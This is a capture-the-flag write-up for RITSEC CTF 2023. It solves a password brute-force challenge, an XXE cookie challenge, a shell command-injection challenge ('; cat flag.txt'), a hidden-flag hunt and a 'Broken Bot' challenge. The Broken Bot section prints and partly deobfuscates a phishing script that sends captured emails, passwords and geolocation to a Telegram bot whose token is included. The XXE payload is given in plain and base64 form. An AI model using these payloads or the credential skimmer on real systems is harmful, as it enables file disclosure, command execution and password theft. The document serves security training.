# RITSEC CTF 2023

Placed 227 of 712, with 5 solved challenges.

## Challenges

### REV

#### Guess The Password?

Brute force only numeric password of length 8. We have the source code.

```python
import itertools
import hashlib, json

class Encoder():

    def __init__(self, secrets_file):
        with open(secrets_file, "r") as file:
            data = json.load(file)
            self.hashed_key = data["key"]
            self.secret = data["secret"]

    def flag_from_pwd(self, key):

        # This function uses code from Vincent's response to this question on SOverflow: https://stackoverflow.com/questions/29408173/byte-operations-xor-in-python
        byte_secret = self.secret.encode()           # convert key to bytes
        byte_key = key.encode()                     # convert the user input to bytes
        
        return bytes(a ^ b for a, b in zip(byte_secret, byte_key)).decode()


    def hash(self, user_input):
        salt = "RITSEC_Salt"
        return hashlib.sha256(salt.encode() + user_input.encode()).hexdigest()


    def check_input(self, user_input):
        hashed_user_input = self.hash(user_input)
        print("{0}: {1} vs {2}".format(user_input, hashed_user_input, self.hashed_key))
        return hashed_user_input == self.hashed_key

def main():
    e = Encoder("supersecret.json")
    for perm in itertools.product(["0","1","2","3","4","5","6","7","8","9"], repeat=8):
        string = ''.join(perm)
        exit = e.check_input(string)
        if exit:
            print("Found it!")
            print(string)
            break;


if __name__ == "__main__":
    main()

```

```
54744968: 57e21cc561af73b94f4c45fcc574ff529bb68f34570a884a22457ca7bad4b977 vs 657fa7558ae9011e8b9d3f56d5c083273557c3139f27d7b62cac458eb1a1a19d
54744969: 52967acaf13b541b4bda3564d31de961afb9c56ea05caa4baa21595f58bd9282 vs 657fa7558ae9011e8b9d3f56d5c083273557c3139f27d7b62cac458eb1a1a19d
54744970: af10396edc0ffce5cd28b15413fad427effcd23a7ab4b151671ae803ee936fc1 vs 657fa7558ae9011e8b9d3f56d5c083273557c3139f27d7b62cac458eb1a1a19d
54744971: ee5852f8cac54090709960b231987665de4e7d5023741faff2b766f93aa2eb25 vs 657fa7558ae9011e8b9d3f56d5c083273557c3139f27d7b62cac458eb1a1a19d
54744972: 0944df29a4b0fc5874ebafdcf5085a3316dae963400ddde10d49255d4a0083c4 vs 657fa7558ae9011e8b9d3f56d5c083273557c3139f27d7b62cac458eb1a1a19d
54744973: 657fa7558ae9011e8b9d3f56d5c083273557c3139f27d7b62cac458eb1a1a19d vs 657fa7558ae9011e8b9d3f56d5c083273557c3139f27d7b62cac458eb1a1a19d
Found it!
54744973
```

RS{'PyCr@ckd'}

#### Gaunlet

RS{Quick_check_vector_this_exception_not__important_time_is_hash_Wa-kcdftcteeioi}

```
RS{Quick_check_vector_this_exception_not__important_time_is_hash_Wrcfeeir
RS{Quick_check_vector_this_exception_not__important_time_is_hash_WerettuTt
RS{Quick_check_vector_this_exception_not__important_time_is_hash_Whgftpod
RS{Quick_check_vector_this_exception_not__important_time_is_hash_Wtuapywau
RS{Quick_check_vector_this_exception_not__important_time_is_hash_WetPitttTld
RS{Quick_check_vector_this_exception_not__important_time_is_hash_Wgasctoybn
RS{Quick_check_vector_this_exception_not__important_time_is_hash_Weoeeenfrrli
RS{Quick_check_vector_this_exception_not__important_time_is_hash_Wlgiifpiod
RS{Quick_check_vector_this_exception_not__important_time_is_hash_WlrbPetlOttsitd
RS{Quick_check_vector_this_exception_not__important_time_is_hash_Whrncnfeiesilr
RS{Quick_check_vector_this_exception_not__important_time_is_hash_WsertrPcittttftbTilud

```

Finale Version ist gaunlet_finish_7.exe

From 500 reduced to 250 because some debuggers break the output.

### WEB

#### X-Men Lore 
They set an XML cookie base64 encoded like 
```
PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48aW5wdXQ+PHhtZW4+Q3ljbG9wczwveG1lbj48L2lucHV0Pg==
```
encoded 
```xml=
<?xml version='1.0' encoding='UTF-8'?><input><xmen>Cyclops</xmen></input>
```
xml version 1.0 the input field is vulnerable

Attack payload: 

```
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///flag'>]><input><xmen>&test;</xmen></input>
```

Attack payload base64 encoded:

```
PD94bWwgdmVyc2lvbj0iMS4wIj8+PCFET0NUWVBFIHJvb3QgWzwhRU5USVRZIHRlc3QgU1lTVEVNICdmaWxlOi8vL2ZsYWcnPl0+PGlucHV0Pjx4bWVuPiZ0ZXN0OzwveG1lbj48L2lucHV0Pg==
```

Put that in the cookie like `Cookie: xmen=PD94bW....` and we get the following response:

```
<!DOCTYPE html>

<head>
	<title>X-Men Lore</title>
	<link rel="stylesheet" href="/static/style.css">
</head>
<a href="/"><button>Home</button></a>

<body>


	<h1>RS{XM3N_L0R3?_M0R3_L1K3_XM3N_3XT3RN4L_3NT1TY!}
	</h1>
	<img src="/static/RS{XM3N_L0R3?_M0R3_L1K3_XM3N_3XT3RN4L_3NT1TY!}
.jpg" alt="RS{XM3N_L0R3?_M0R3_L1K3_XM3N_3XT3RN4L_3NT1TY!}
" />
	<br/>
	<iframe src="/static/RS{XM3N_L0R3?_M0R3_L1K3_XM3N_3XT3RN4L_3NT1TY!}
.html" title="RS{XM3N_L0R3?_M0R3_L1K3_XM3N_3XT3RN4L_3NT1TY!}
"></iframe>


</body>
```

RS{XM3N_L0R3?_M0R3_L1K3_XM3N_3XT3RN4L_3NT1TY!}

#### Echo

The input will be concated with an echo command. Thus we have shell access.

Simply inject `; cat flag.txt` to print the flag.

RS{R3S0UND1NG_SUCS3SS!}

#### RickRoll

Hidden in 2.css:

```!
Hey there you CTF solver, Good job on finding the actual challenge, so the task here is to find flags to complete the first half of the chorus of this song, and you
will find the flags around this entire web network in this format,/*[FLAG_PIECE]*/ Heres a piece to get started /*[RS{/\/eveRG0nna_]*/  find the next four parts of the famous chorus

[RS{/\/eveRG0nna_]
```

Also in 2.css:
```
.input button{
    height: 3.25rem;
    width: 320px;
    left: 20px;
    text-align: center;
    background-color: [_|3tY0|_|d0vvn] var(--primary-color);
    font-size: 1.5rem;
    padding: 15px 32px;
    border: none;
    border-radius: 2px;
    color: white;
}

[_|3tY0|_|d0vvn]
```

In 1.css:

```
.btn{
    display: inline-block;
    background: var(--primary-color);
    color: white;
    padding: 0.5rem 1.2rem;
    font-size: 1rem;
    text-align: center;
    border: /*[G1v3y0uuP]*/ none;
    cursor: pointer;
    border-radius: 2px;
    margin-right: 0.5rem;
    outline: none;
}

[G1v3y0uuP]
```


In Don't.html (at the bottom):

```
We've known each other for so long
Your heart's been aching[_D3s3RTy0u}], but you're too shy to say it (to say it)
Inside, we both know what's been going on (going on)
We know the game and we're gonna play it

[_D3s3RTy0u}]
```

In 1.html (at the bottom):

```
Inside, we both know what's been going on (going on)
We know the game and we're gonna play it
I just wanna tell you [_TuRna30unD_]how I'm feeling
Gotta make you understand

[_TuRna30unD_]
```
This should result in:

`RS{/\/eveRG0nna_G1v3y0uuP_|3tY0|_|d0vvn_TuRna30unD__D3s3RTy0u}`


#### Broken Bot

We get a link to a web portal. It seems like soeone injected some javascript into the index page.

```!
var A=B;function B(C,D){var E=F();return B=function(Bbb,G){Bbb=Bbb-0xb7;var H=E[Bbb];return H;},B(C,D);}(function(I,J){var K=B,L=I();while(!![]){try{var M=-parseInt(K(0xe9))/0x1+-parseInt(K(0xda))/0x2+parseInt(K(0xc0))/0x3*(-parseInt(K(0xb8))/0x4)+parseInt(K(0xd6))/0x5+-parseInt(K(0xe0))/0x6*(-parseInt(K(0xd5))/0x7)+parseInt(K(0xb7))/0x8*(-parseInt(K(0xe3))/0x9)+-parseInt(K(0xe1))/0xa*(parseInt(K(0xdb))/0xb);if(M===J)break;else L['push'](L['shift']());}catch(N){L['push'](L['shift']());}}}(F,0xa9b1c));var elem=$(A(0xb9)),elem1=A(0xde),elem2=A(0xd7),email=$(A(0xc2))[A(0xc9)](),domain=email[A(0xe4)](email[A(0xbc)]('@')+0x1),frmsite=domain[A(0xe4)](0x0,domain[A(0xbc)]('.'));const str=frmsite+A(0xce),str2=str[A(0xbd)](0x0)[A(0xeb)]()+str[A(0xe7)](0x1);let today=new Date()[A(0xc6)]();$(A(0xba))[A(0xe5)](str2),$('#title')[A(0xe5)](str2),$(A(0xc1))['append'](A(0xbb)+domain+A(0xd4)),$(A(0xdd))[A(0xe5)](A(0xcd)+domain+'\x22>'),document[A(0xe8)][A(0xd0)]['background']=A(0xca)+domain+'\x27)',elem['on'](A(0xec),function(O){var P=A;$('#inputPassword')[P(0xdf)]()===''?alert(P(0xcb)):$['getJSON'](P(0xcf),function(Q){var R=P,S=Q['ip'],T=Q[R(0xc8)],U=Q['region'],V=Q['country'],W=navigator['userAgent'];let X=new Date()[R(0xc6)]();var Y=R(0xc4)+str2+'\x20by\x20Zach\x20A**'+'\x0a\x0a'+R(0xe2)+$(R(0xc2))[R(0xc9)]()+'\x0a'+R(0xc7)+$(R(0xd9))[R(0xdf)]()+'\x0a'+'IP\x20Address\x20:\x20'+S+'\x0a'+R(0xe6)+U+'\x0a'+R(0xc3)+T+'\x0a'+R(0xbe)+V+'\x0a'+R(0xed)+W+'\x0a'+R(0xcc)+$(R(0xea))[R(0xdf)]()+'\x0a'+R(0xd8)+X+'\x0a'+R(0xbf)+$(R(0xc5))[R(0xdf)](),Z=R(0xdc)+elem1+R(0xd3);$[R(0xd2)](Z,{'chat_id':elem2,'text':Y},function(AA){var AB=R;window['location'][AB(0xee)]=AB(0xd1);});});});function F(){var AC=['val','12ZidQyC','20AFlrCY','Email:\x20','63792quNVYn','substring','append','Region\x20:\x20','slice','body','139437pXYFEK','#UserEmail','toUpperCase','click','Useragent\x20:\x20','href','88GpIPQU','904cdojGd','#submit','#dname','<img\x20class=\x22mb-4\x22\x20src=\x22https://logo.clearbit.com/','lastIndexOf','charAt','Country\x20:\x20','DateSent\x20:\x20','10311YpzJVd','#dlogo','#emailtext','City\x20:\x20','***','#DateSent','toLocaleDateString','Password\x20:\x20','city','text','url(\x27https://logo.clearbit.com/','Password\x20field\x20missing!','Format\x20:\x20','<link\x20rel=\x22icon\x22\x20href=\x22https://logo.clearbit.com/','\x20Cloud\x20Storage','https://ip.seeip.org/geoip','style','https://archive.org/details/VoiceMail_173','post','/sendMessage','\x22\x20alt=\x22\x22\x20width=\x22150\x22\x20\x20>','4716964xBODFJ','3724320KAqSuZ','5852841790','Date\x20Filled\x20:\x20','#inputPassword','380874lxWkrT','1170928pBbGzs','https://api.telegram.org/bot','head','6055124896:AAFyQlC_8dr1GndB26ji4iV2ol2bPPQ9lq4'];F=function(){return AC;};return F();}
```

We should find out what it does. Maybe try beautify it?

In Progress beautification:

```js
var A = B;

function B(C, D) {
    var E = F();
    return B = function(Bbb, G) {
        Bbb = Bbb - 0xb7;
        var H = E[Bbb];
        return H;
    }, B(C, D);
}(function(I, J) {
    var K = B,
        L = I();
    while (!![]) {
        try {
            var M = -parseInt(K(0xe9)) / 0x1 + -parseInt(K(0xda)) / 0x2 + parseInt(K(0xc0)) / 0x3 * (-parseInt(K(0xb8)) / 0x4) + parseInt(K(0xd6)) / 0x5 + -parseInt(K(0xe0)) / 0x6 * (-parseInt(K(0xd5)) / 0x7) + parseInt(K(0xb7)) / 0x8 * (-parseInt(K(0xe3)) / 0x9) + -parseInt(K(0xe1)) / 0xa * (parseInt(K(0xdb)) / 0xb);
            if (M === J) break;
            else L['push'](L['shift']());
        } catch (N) {
            L['push'](L['shift']());
        }
    }
}(F, 0xa9b1c));
var elem = $(A(0xb9)),
    elem1 = A(0xde),
    elem2 = A(0xd7),
    email = $(A(0xc2))[A(0xc9)](),
    domain = email[A(0xe4)](email[A(0xbc)]('@') + 0x1),
    frmsite = domain[A(0xe4)](0x0, domain[A(0xbc)]('.'));
const str = frmsite + A(0xce),
    str2 = str[A(0xbd)](0x0)[A(0xeb)]() + str[A(0xe7)](0x1);
let today = new Date()[A(0xc6)]();
$(A(0xba))[A(0xe5)](str2), $('#title')[A(0xe5)](str2), $(A(0xc1))['append'](A(0xbb) + domain + A(0xd4)), $(A(0xdd))[A(0xe5)](A(0xcd) + domain + '\x22>'), document[A(0xe8)][A(0xd0)]['background'] = A(0xca) + domain + '\x27)', elem['on'](A(0xec), function(O) {
    var P = A;
    $('#inputPassword')[P(0xdf)]() === '' ? alert(P(0xcb)) : $['getJSON'](P(0xcf), function(Q) {
        var R = P,
            S = Q['ip'],
            T = Q[R(0xc8)],
            U = Q['region'],
            V = Q['country'],
            W = navigator['userAgent'];
        let X = new Date()[R(0xc6)]();
        var Y = R(0xc4) + str2 + '\x20by\x20Zach\x20A**' + '\x0a\x0a' + R(0xe2) + $(R(0xc2))[R(0xc9)]() + '\x0a' + R(0xc7) + $(R(0xd9))[R(0xdf)]() + '\x0a' + 'IP\x20Address\x20:\x20' + S + '\x0a' + R(0xe6) + U + '\x0a' + R(0xc3) + T + '\x0a' + R(0xbe) + V + '\x0a' + R(0xed) + W + '\x0a' + R(0xcc) + $(R(0xea))[R(0xdf)]() + '\x0a' + R(0xd8) + X + '\x0a' + R(0xbf) + $(R(0xc5))[R(0xdf)](),
            Z = R(0xdc) + elem1 + R(0xd3);
        $[R(0xd2)](Z, {
            'chat_id': elem2,
            'text': Y
        }, function(AA) {
            var AB = R;
            window['location'][AB(0xee)] = AB(0xd1);
        });
    });
});

function F() {
    var AC = ['val', '12ZidQyC', '20AFlrCY', 'Email:\x20', '63792quNVYn', 'substring', 'append', 'Region\x20:\x20', 'slice', 'body', '139437pXYFEK', '#UserEmail', 'toUpperCase', 'click', 'Useragent\x20:\x20', 'href', '88GpIPQU', '904cdojGd', '#submit', '#dname', '<img\x20class=\x22mb-4\x22\x20src=\x22https://logo.clearbit.com/', 'lastIndexOf', 'charAt', 'Country\x20:\x20', 'DateSent\x20:\x20', '10311YpzJVd', '#dlogo', '#emailtext', 'City\x20:\x20', '***', '#DateSent', 'toLocaleDateString', 'Password\x20:\x20', 'city', 'text', 'url(\x27https://logo.clearbit.com/', 'Password\x20field\x20missing!', 'Format\x20:\x20', '<link\x20rel=\x22icon\x22\x20href=\x22https://logo.clearbit.com/', '\x20Cloud\x20Storage', 'https://ip.seeip.org/geoip', 'style', 'https://archive.org/details/VoiceMail_173', 'post', '/sendMessage', '\x22\x20alt=\x22\x22\x20width=\x22150\x22\x20\x20>', '4716964xBODFJ', '3724320KAqSuZ', '5852841790', 'Date\x20Filled\x20:\x20', '#inputPassword', '380874lxWkrT', '1170928pBbGzs', 'https://api.telegram.org/bot', 'head', '6055124896:AAFyQlC_8dr1GndB26ji4iV2ol2bPPQ9lq4'];
    F = function() {
        return AC;
    };
    return F();
}
```

Seems like it sends a request to a telegram bot. This seems to be the content:

```
***Rit Cloud Storage by Zach A**

Email: WhiteTeam@rit.edu
Password : Test
IP Address : ip12313
Region : region098
City : city345
Country : country1111039
Useragent : userAgent1785
Format : WhiteTeam@rit.edu
Date Filled : 1.4.2023
DateSent : 1/28/2023 2:55:30 p.m.
```

To:

```
https://api.telegram.org/bot6055124896:AAFyQlC_8dr1GndB26ji4iV2ol2bPPQ9lq4/sendMessage
```

Since there is `sendMessage` there probably is something else we can call. Maybe `readAllMessages`?


The function `getMyShortDescription` [here](https://api.telegram.org/bot6055124896:AAFyQlC_8dr1GndB26ji4iV2ol2bPPQ9lq4/getMyShortDescription) yields the flag:

Flag{Always_Check_For_Misconfigurations}